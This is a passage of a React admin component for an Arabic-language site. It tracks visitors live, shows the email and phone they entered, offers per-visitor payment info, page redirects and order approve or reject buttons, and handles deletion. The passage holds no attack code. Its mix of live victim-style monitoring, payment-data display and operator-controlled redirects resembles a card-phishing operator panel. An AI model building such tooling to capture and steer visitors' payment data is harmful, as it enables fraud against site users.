              {alert.actionIcon}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-[12px] font-semibold text-slate-700 truncate">{alert.visitorName}</p>
              <p className={`text-[10px] font-medium ${alert.isNew ? "text-emerald-500" : "text-violet-500"}`}>
                {alert.isNew ? "🟢 زائر جديد دخل الموقع" : alert.actionLabel}
              </p>
            </div>
            <button
              onClick={() => removeSideAlert(alert.id)}
              className="shrink-0 w-5 h-5 rounded-full bg-slate-100 flex items-center justify-center hover:bg-slate-200 transition-colors"
            >
              <X className="w-3 h-3 text-slate-400" />
            </button>
          </div>
        ))}
      </div>

      <div className="flex flex-col gap-3 h-[calc(100vh-120px)]" dir="rtl">

        {/* شريط المعلومات العلوي */}
        <div className="flex items-center justify-between gap-3">
          {/* إحصائيات - يسار */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 bg-white border border-emerald-100 rounded-xl px-4 py-2.5 shadow-sm">
              <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span className="text-[13px] font-bold text-emerald-600">{onlineCount}</span>
              <span className="text-[11px] text-slate-400">متصل الآن</span>
            </div>
            <div className="flex items-center gap-2 bg-white border border-blue-100 rounded-xl px-4 py-2.5 shadow-sm">
              <Users className="w-3.5 h-3.5 text-blue-400" />
              <span className="text-[13px] font-bold text-blue-600">{totalCount}</span>
              <span className="text-[11px] text-slate-400">إجمالي الزوار</span>
            </div>
          </div>

          {/* أزرار المسح - يمين */}
          <div className="flex items-center gap-2">
            <button
              onClick={(e) => { createRipple(e); deleteAll(); }}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors btn-press relative overflow-hidden"
            >
              <Trash2 className="w-3.5 h-3.5" /> مسح جميع المحادثات
            </button>
            <button
              onClick={(e) => { createRipple(e); playChime("click"); setSelectMode(!selectMode); if (selectMode) setSelectedIds(new Set()); }}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[11px] font-medium transition-all btn-press relative overflow-hidden ${
                selectMode ? "bg-blue-500 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              <CheckSquare className="w-3.5 h-3.5" />
              {selectMode ? "إلغاء التحديد" : "تحديد محادثات"}
            </button>
            {selectMode && selectedIds.size > 0 && (
              <button
                onClick={deleteSelected}
                className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-500 text-white text-[11px] font-medium hover:bg-red-600 transition-colors"
              >
                <Trash2 className="w-3.5 h-3.5" /> حذف المحدد ({selectedIds.size})
              </button>
            )}
          </div>
        </div>

        <div className="flex flex-col lg:flex-row gap-4 flex-1 min-h-0 overflow-auto lg:overflow-hidden">

          {/* قائمة الزوار - يمين بعرض ربع الشاشة */}
          <div className="w-full lg:w-[280px] xl:w-[300px] shrink-0 flex flex-col gap-2 overflow-y-auto scrollbar-thin">

            {/* فلتر + سلة المحذوفات */}
            <div className="bg-white rounded-2xl border border-slate-200 p-3 space-y-2 shrink-0">
              <button
                onClick={() => { playChime("click"); setShowTrash(!showTrash); setSelectMode(false); setSelectedIds(new Set()); }}
                className={`w-full flex items-center justify-center gap-1.5 py-2 rounded-xl text-[11px] font-medium transition-all btn-press ${
                  showTrash ? "bg-amber-500 text-white" : "bg-amber-50 text-amber-600 hover:bg-amber-100"
                }`}
              >
                <Archive className="w-3.5 h-3.5" />
                {showTrash ? "العودة للزوار" : `سلة المحذوفات (${deletedVisitors.length})`}
              </button>
              {!showTrash && (
                <div className="flex gap-1 bg-slate-50 rounded-xl p-1">
                  {[
                    { key: "all" as const, label: "الكل", count: visitors.length },
                    { key: "online" as const, label: "متصل", count: onlineCount },
                    { key: "offline" as const, label: "غير متصل", count: visitors.length - onlineCount },
                  ].map(tab => (
                    <button
                      key={tab.key}
                      onClick={() => setFilter(tab.key)}
                      className={`flex-1 py-1.5 rounded-lg text-[10px] font-medium transition-all ${
                        filter === tab.key ? "bg-blue-500 text-white shadow-sm" : "text-slate-500 hover:bg-white"
                      }`}
                    >
                      {tab.label} ({tab.count})
                    </button>
                  ))}
                </div>
              )}
            </div>

            {/* قائمة الزوار */}
            {showTrash ? (
              <div className="space-y-1.5">
                {deletedVisitors.length > 0 && (
                  <div className="flex flex-col gap-1.5 mb-2">
                    <div className="flex gap-1.5">
                      <button onClick={(e) => { createRipple(e); setConfirmDelete({ type: "all" }); }} className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-red-50 text-red-500 text-[10px] font-medium hover:bg-red-100 transition-colors">
                        <Trash2 className="w-3 h-3" /> حذف نهائي للكل
                      </button>
                      <button onClick={() => { playChime("click"); restoreAllVisitors(); }} className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-emerald-50 text-emerald-600 text-[10px] font-medium hover:bg-emerald-100 transition-colors">
                        <RotateCcw className="w-3 h-3" /> استعادة الكل
                      </button>
                    </div>
                  </div>
                )}
                {deletedVisitors.map((visitor) => (
                  <div key={visitor.id} className="bg-white rounded-xl border border-slate-100 p-2.5">
                    <div className="flex items-center gap-2">
                      {selectMode && (
                        <button onClick={() => toggleSelect(visitor.id)} className="shrink-0">
                          {selectedIds.has(visitor.id) ? <CheckSquare className="w-4 h-4 text-blue-500" /> : <Square className="w-4 h-4 text-slate-300" />}
                        </button>
                      )}
                      <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-[12px] font-bold text-slate-400">
                        {(visitor.name || "ز")[0]}
                      </div>
                      <div className="flex-1 min-w-0">
                        <span className="text-[12px] font-semibold text-slate-600 truncate block">{visitor.name || "زائر جديد"}</span>
                        <span className="text-[9px] text-slate-400">{visitor.device === "mobile" ? "Mobile" : "Desktop"}</span>
                      </div>
                      <div className="flex gap-1 shrink-0">
                        <button onClick={() => restoreVisitor(visitor.id)} className="p-1 rounded-lg bg-emerald-50 text-emerald-500 hover:bg-emerald-100 transition-colors" title="استعادة">
                          <RotateCcw className="w-3 h-3" />
                        </button>
                        <button onClick={() => setConfirmDelete({ type: "single", id: visitor.id })} className="p-1 rounded-lg bg-red-50 text-red-500 hover:bg-red-100 transition-colors" title="حذف نهائي">
                          <Trash2 className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
                {deletedVisitors.length === 0 && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">سلة المحذوفات فارغة</div>
                )}
              </div>
            ) : (
              <div className="space-y-1.5">
                {filtered.map((visitor) => {
                  const isSelected = selected?.id === visitor.id;
                  const pendingOrders = visitorOrders.filter(o => o.status === "pending");
                  return (
                    <div
                      key={visitor.id}
                      onClick={() => { if (!selectMode) { playChime(isSelected ? "whoosh" : "pop"); setSelected(isSelected ? null : visitor); } }}
                      className={`bg-white rounded-xl border transition-all duration-200 p-2.5 cursor-pointer hover:shadow-sm ${
                        isSelected ? "border-blue-400 bg-blue-50/40 shadow-sm" : "border-slate-100 hover:border-slate-200"
                      } ${flashVisitorId === visitor.id ? "ring-2 ring-violet-400 bg-violet-50/60" : ""}`}
                    >
                      <div className="flex items-center gap-2">
                        {selectMode && (
                          <button onClick={(e) => { e.stopPropagation(); toggleSelect(visitor.id); }} className="shrink-0">
                            {selectedIds.has(visitor.id) ? <CheckSquare className="w-4 h-4 text-blue-500" /> : <Square className="w-4 h-4 text-slate-300" />}
                          </button>
                        )}
                        {/* أفاتار + مؤشر الاتصال */}
                        <div className="relative shrink-0">
                          <div className={`w-9 h-9 rounded-full flex items-center justify-center text-[13px] font-bold ${visitor.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"}`}>
                            {(visitor.name || "ز")[0]}
                          </div>
                          <span className={`absolute -bottom-0.5 -left-0.5 w-2.5 h-2.5 rounded-full border-2 border-white ${visitor.is_online ? "bg-emerald-400" : "bg-slate-300"}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          {/* اسم + حالة الاتصال */}
                          <div className="flex items-center justify-between gap-1">
                            <span className="text-[12px] font-semibold text-slate-700 truncate">{visitor.name || "زائر جديد"}</span>
                            <div className="flex items-center gap-1 shrink-0">
                              {/* مؤشر انتظار رد */}
                              {isSelected && pendingOrders.length > 0 && (
                                <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" title="ينتظر رد" />
                              )}
                              {visitor.is_online
                                ? <span className="text-[9px] font-medium text-emerald-500 bg-emerald-50 px-1.5 py-0.5 rounded-full">متصل</span>
                                : <span className="text-[9px] font-medium text-slate-400 bg-slate-50 px-1.5 py-0.5 rounded-full">غير متصل</span>
                              }
                            </div>
                          </div>
                          {/* الصفحة الحالية */}
                          <div className="flex items-center gap-1 mt-0.5">
                            <MapPin className="w-2.5 h-2.5 text-slate-300 shrink-0" />
                            <span className="text-[10px] text-slate-400 truncate">{visitor.current_page_label}</span>
                          </div>
                          {/* آخر نشاط */}
                          <div className="flex items-center gap-1 mt-0.5">
                            <Clock className="w-2.5 h-2.5 text-slate-300 shrink-0" />
                            <span className="text-[9px] text-slate-400">{getTimeDiff(visitor.last_seen)}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
                {filtered.length === 0 && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">لا يوجد زوار</div>
                )}
              </div>
            )}
          </div>

          {/* لوحة التفاصيل - يسار */}
          <div className="flex-1 hidden lg:block min-h-0">
            {selected ? (
              <div className="bg-white rounded-2xl border border-slate-200 h-full flex flex-col overflow-hidden">
                {/* رأس البوكس: اسم الزائر + حالة الاتصال */}
                <div className="p-4 border-b border-slate-100 shrink-0">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      <div className={`w-12 h-12 rounded-2xl flex items-center justify-center text-[18px] font-bold ${selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"}`}>
                        {(selected.name || "ز")[0]}
                      </div>
                      <span className={`absolute -bottom-1 -left-1 w-3.5 h-3.5 rounded-full border-[2.5px] border-white ${selected.is_online ? "bg-emerald-400" : "bg-slate-300"}`} />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2">
                        {/* اسم الزائر واضح وكبير */}
                        <h2 className="text-[20px] font-bold text-slate-800">{selected.name || "زائر جديد"}</h2>
                        {/* زر التنبيه - متصل أو لا */}
                        <span className={`inline-flex items-center gap-1.5 text-[11px] font-semibold px-2.5 py-1 rounded-full border ${
                          selected.is_online
                            ? "bg-emerald-50 text-emerald-600 border-emerald-200"
                            : "bg-slate-50 text-slate-400 border-slate-200"
                        }`}>
                          {selected.is_online
                            ? <><span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> متصل</>
                            : <><span className="w-1.5 h-1.5 rounded-full bg-slate-300" /> غير متصل</>
                          }
                        </span>
                      </div>
                      {/* مكان وجود الزائر بالموقع */}
                      <div className="flex items-center gap-1.5 mt-1">
                        <Eye className="w-3.5 h-3.5 text-blue-400" />
                        <span className="text-[13px] text-blue-500 font-medium">يتصفح: {selected.current_page_label}</span>
                      </div>
                    </div>
                    {/* زر مسح */}
                    <button
                      onClick={() => deleteSingle(selected.id)}
                      className="p-2 rounded-xl bg-red-50 text-red-400 hover:bg-red-100 transition-colors"
                      title="مسح محادثة الزائر"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                {/* محتوى البوكس */}
                <div className="p-4 space-y-3 flex-1 overflow-y-auto scrollbar-thin">

                  {/* أزرار الموافقة والرفض */}
                  {visitorOrders.some(o => o.status !== "confirmed" && o.status !== "rejected") && (
                    <div className="border border-amber-100 rounded-xl overflow-hidden">
                      <div className="bg-amber-50 px-4 py-2 flex items-center gap-2">
                        <AlertCircle className="w-3.5 h-3.5 text-amber-500" />
                        <span className="text-[12px] font-semibold text-amber-600">طلبات تنتظر الرد</span>
                      </div>
                      <div className="p-3 flex gap-2">
                        {visitorOrders.filter(o => o.status !== "confirmed" && o.status !== "rejected").map(order => (
                          <div key={order.id} className="flex-1 flex gap-2">
                            <button
                              onClick={() => updateOrderStatus(order.id, "confirmed")}
                              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-emerald-500 text-white text-[12px] font-semibold hover:bg-emerald-600 transition-colors shadow-sm"
                            >
                              <CheckCircle className="w-4 h-4" /> موافقة
                            </button>
                            <button
                              onClick={() => updateOrderStatus(order.id, "rejected")}
                              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-red-500 text-white text-[12px] font-semibold hover:bg-red-600 transition-colors shadow-sm"
                            >
                              <XCircle className="w-4 h-4" /> رفض
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* بيانات الزائر المدخلة */}
                  {(selected.email || selected.phone) && (
                    <div className="border border-purple-100 rounded-xl overflow-hidden">
                      <div className="bg-purple-50 px-4 py-2">
                        <span className="text-[12px] font-semibold text-purple-600">بيانات الزائر المدخلة</span>
                      </div>
                      <div className="p-3 space-y-2">
                        {selected.email && (
                          <div className="flex items-center gap-2.5 bg-slate-50 rounded-lg p-2.5">
                            <Globe className="w-3.5 h-3.5 text-slate-400" />
                            <div>
                              <p className="text-[10px] text-slate-400">البريد الإلكتروني</p>
                              <p className="text-[12px] font-medium text-slate-700" dir="ltr">{selected.email}</p>
                            </div>
                          </div>
                        )}
                        {selected.phone && (
                          <div className="flex items-center gap-2.5 bg-slate-50 rounded-lg p-2.5">
                            <Smartphone className="w-3.5 h-3.5 text-slate-400" />
                            <div>
                              <p className="text-[10px] text-slate-400">رقم الجوال</p>
                              <p className="text-[12px] font-medium text-slate-700" dir="ltr">{selected.phone}</p>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* معلومات الزائر */}
                  <div className="border border-blue-100 rounded-xl overflow-hidden">
                    <div className="bg-blue-50 px-4 py-2">
                      <span className="text-[12px] font-semibold text-blue-600">معلومات الزائر</span>
                    </div>
                    <div className="p-3 grid grid-cols-2 gap-2">
                      {[
                        { label: "الجهاز", value: selected.device === "mobile" ? "جوال" : "كمبيوتر", icon: selected.device === "mobile" ? Smartphone : Monitor },
                        { label: "المتصفح", value: selected.browser, icon: Globe },
                        { label: "الدولة", value: `${countryFlag(selected.country)} ${selected.country}`, icon: MapPin },
                        { label: "آخر نشاط", value: getTimeDiff(selected.last_seen), icon: Clock },
                      ].map(info => (
                        <div key={info.label} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                          <info.icon className="w-3.5 h-3.5 text-slate-400 shrink-0" />
                          <div>
                            <p className="text-[9px] text-slate-400">{info.label}</p>
                            <p className="text-[12px] font-medium text-slate-700">{info.value}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* إحصائيات */}
                  <div className="border border-emerald-100 rounded-xl overflow-hidden">
                    <div className="bg-emerald-50 px-4 py-2">
                      <span className="text-[12px] font-semibold text-emerald-600">إحصائيات التصفح</span>
                    </div>
                    <div className="p-3 grid grid-cols-3 gap-2">
                      {[
                        { label: "إجمالي الزيارات", value: (selected.total_visits || 0).toString() },
                        { label: "الصفحات المشاهدة", value: (selected.pages_viewed || 0).toString() },
                        { label: "مدة الجلسة", value: getDuration(selected.session_start) },
                      ].map(stat => (
                        <div key={stat.label} className="text-center bg-slate-50 rounded-lg p-2.5">
                          <p className="text-[16px] font-bold text-slate-800">{stat.value}</p>
                          <p className="text-[9px] text-slate-400 mt-0.5">{stat.label}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  {renderActionsLog(false)}
                  {renderOrdersBookings(false)}
                  {renderPaymentInfo(false)}
                  {renderRedirectDropdown(selected, false)}

                  {/* زر مسح المحادثة */}
                  <button
                    onClick={() => deleteSingle(selected.id)}
                    className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl bg-red-50 text-red-500 text-[12px] font-medium hover:bg-red-100 transition-colors"
                  >
                    <Trash2 className="w-4 h-4" /> مسح محادثة الزائر
                  </button>
                </div>
              </div>
            ) : (
              /* مستطيل "اختر زائر" */
              <div className="bg-white rounded-2xl border-2 border-dashed border-slate-200 h-full flex items-center justify-center">
                <div className="text-center">
                  <div className="w-16 h-16 rounded-2xl bg-slate-50 flex items-center justify-center mx-auto mb-3">
                    <Users className="w-8 h-8 text-slate-300" />
                  </div>
                  <p className="text-[15px] font-medium text-slate-400">اختر زائر لعرض التفاصيل</p>
                  <p className="text-[12px] text-slate-300 mt-1">اضغط على أي زائر من القائمة</p>
                </div>
              </div>
            )}
          </div>

          {/* Mobile expanded */}
          <div className="lg:hidden space-y-1.5">
            {!showTrash && filtered.map((visitor) => {
              const isExpanded = selected?.id === visitor.id;
              return (
                <div key={visitor.id}>
                  <div
                    className={`w-full text-right bg-white rounded-xl border transition-all duration-300 p-3 cursor-pointer ${
                      isExpanded ? "border-blue-400 bg-blue-50/40" : "border-slate-100"
                    } ${flashVisitorId === visitor.id ? "ring-2 ring-violet-400 bg-violet-50/60" : ""}`}
                    onClick={() => { if (!selectMode) { playChime(isExpanded ? "whoosh" : "pop"); setSelected(isExpanded ? null : visitor); } }}
                  >
                    <div className="flex items-center gap-2.5">
                      {selectMode && (
                        <button onClick={(e) => { e.stopPropagation(); toggleSelect(visitor.id); }} className="shrink-0">
                          {selectedIds.has(visitor.id) ? <CheckSquare className="w-4 h-4 text-blue-500" /> : <Square className="w-4 h-4 text-slate-300" />}
                        </button>
                      )}
                      <div className="relative shrink-0">
                        <div className={`w-9 h-9 rounded-full flex items-center justify-center text-[13px] font-bold ${visitor.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"}`}>
                          {(visitor.name || "ز")[0]}
                        </div>
                        <span className={`absolute -bottom-0.5 -left-0.5 w-2.5 h-2.5 rounded-full border-2 border-white ${visitor.is_online ? "bg-emerald-400" : "bg-slate-300"}`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between">
                          <span className="text-[13px] font-semibold text-slate-700 truncate">{visitor.name || "زائر جديد"}</span>
                          <div className="flex items-center gap-1.5 shrink-0">
                            {visitor.is_online ? <Wifi className="w-3.5 h-3.5 text-emerald-400" /> : <WifiOff className="w-3.5 h-3.5 text-slate-300" />}
                            <ChevronDown className={`w-3.5 h-3.5 text-slate-400 transition-transform duration-200 ${isExpanded ? "rotate-180" : ""}`} />
                          </div>
                        </div>
                        <div className="flex items-center gap-1 mt-0.5">
                          <MapPin className="w-2.5 h-2.5 text-slate-300" />
                          <span className="text-[10px] text-slate-400 truncate">{visitor.current_page_label}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                  {isExpanded && (
                    <div className="bg-white rounded-xl border border-blue-200 p-3 mt-1 space-y-3">
                      <div className="flex items-center gap-2">
                        <Eye className="w-3.5 h-3.5 text-blue-400" />
                        <span className="text-[12px] text-blue-500 font-medium">يتصفح: {visitor.current_page_label}</span>
                      </div>
                      {(visitor.email || visitor.phone) && (
                        <div className="border border-purple-100 rounded-lg overflow-hidden">
                          <div className="bg-purple-50 px-3 py-1.5">
                            <span className="text-[11px] font-semibold text-purple-600">بيانات الزائر</span>
                          </div>
                          <div className="p-2.5 space-y-1.5">
                            {visitor.email && <div className="flex items-center gap-2 text-[11px]"><Globe className="w-3.5 h-3.5 text-slate-400" /><span className="text-slate-700" dir="ltr">{visitor.email}</span></div>}
                            {visitor.phone && <div className="flex items-center gap-2 text-[11px]"><Smartphone className="w-3.5 h-3.5 text-slate-400" /><span className="text-slate-700" dir="ltr">{visitor.phone}</span></div>}
                          </div>
                        </div>
                      )}
                      {renderActionsLog(true)}
                      {renderOrdersBookings(true)}
                      {renderPaymentInfo(true)}
                      {renderRedirectDropdown(visitor, true)}
                      <button onClick={(e) => { e.stopPropagation(); deleteSingle(visitor.id); }} className="w-full flex items-center justify-center gap-1.5 py-2 rounded-lg bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors">
                        <Trash2 className="w-3.5 h-3.5" /> مسح الزائر
                      </button>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </div>

      <AlertDialog open={!!confirmDelete} onOpenChange={(open) => !open && setConfirmDelete(null)}>
        <AlertDialogContent dir="rtl" className="max-w-sm">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-right">تأكيد الحذف النهائي</AlertDialogTitle>
            <AlertDialogDescription className="text-right">
              {confirmDelete?.type === "all"
                ? "هل أنت متأكد من حذف جميع الزوار نهائياً؟ لا يمكن التراجع عن هذا الإجراء."
                : confirmDelete?.type === "selected"
                ? `هل أنت متأكد من حذف (${selectedIds.size}) زائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء.`
                : "هل أنت متأكد من حذف هذا الزائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء."}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex gap-2 sm:flex-row-reverse">
            <AlertDialogCancel className="mt-0">إلغاء</AlertDialogCancel>
            <AlertDialogAction onClick={handleConfirmPermanentDelete} className="bg-red-500 text-white hover:bg-red-600">
              حذف نهائي
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
};

export default AdminVisitors;
